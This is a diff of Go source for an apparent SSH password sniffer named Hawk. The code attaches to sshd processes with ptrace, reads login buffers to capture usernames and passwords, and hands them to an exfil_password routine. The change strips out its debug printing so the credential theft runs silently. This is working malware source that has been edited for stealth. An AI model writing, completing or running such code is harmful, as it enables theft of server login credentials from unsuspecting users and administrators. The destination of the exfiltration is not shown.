@@ -8,15 +8,12 @@ import (
 )
 
 func traceSSHDProcess(pid int) {
-	fmt.Printf("[Hawk] SSH Connection Identified on pid: %d.\n", pid)
-
 	err := syscall.PtraceAttach(pid)
 	if err != nil {
 		return
 	}
 	defer func() {
 		syscall.PtraceDetach(pid)
-		fmt.Printf("[Hawk] Detached from pid: %d.\n", pid)
 	}()
 
 	var wstatus syscall.WaitStatus
@@ -35,7 +32,6 @@ func traceSSHDProcess(pid int) {
 			var regs syscall.PtraceRegs
 			err := syscall.PtraceGetRegs(pid, &regs)
 			if err != nil {
-				fmt.Println("PtraceGetRegs:", err)
 				syscall.PtraceDetach(pid)
 				return
 			}
@@ -44,7 +40,6 @@ func traceSSHDProcess(pid int) {
 				buffer := make([]byte, regs.Rdx)
 				_, err := syscall.PtracePeekData(pid, uintptr(regs.Rsi), buffer)
 				if err != nil {
-					fmt.Println("Error reading buffer:", err)
 					return
 				}
 				if len(buffer) < 250 && len(buffer) > 5 && string(buffer) != "" {
@@ -57,12 +52,8 @@ func traceSSHDProcess(pid int) {
 					var password = string(buffer)
 					valid := regexp.MustCompile(`\x00\x00\x00[^\n]*\f$`).MatchString(password)
 					if !valid {
-						fmt.Printf("username: %q\n password: %q\n", username, removeFirstFourBytes(password))
 						go exfil_password(username, removeFirstFourBytes(password))
-						fmt.Printf("finished \n")
 					}
-				} else {
-					fmt.Printf("rdi: %d, rax: %d\n", regs.Rdi, regs.Orig_rax)
 				}
 			}
 		}
